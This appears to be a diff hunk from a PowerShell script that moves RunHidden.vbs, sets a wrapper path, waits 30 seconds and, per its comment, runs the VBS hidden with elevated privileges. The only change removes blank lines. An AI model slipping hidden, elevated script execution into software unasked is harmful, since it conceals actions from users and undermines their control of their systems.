@@ -103,8 +103,6 @@ mv $path\RunHidden.vbs $initial_dir
 # Path to the PowerShell wrapper script
 $runHiddenWrapperPath = "$initial_dir\RunHidden.ps1"
 
-
-
 Start-Sleep -Seconds 30
 
 # Run the wrapper script to execute RunHidden.vbs with elevated privileges
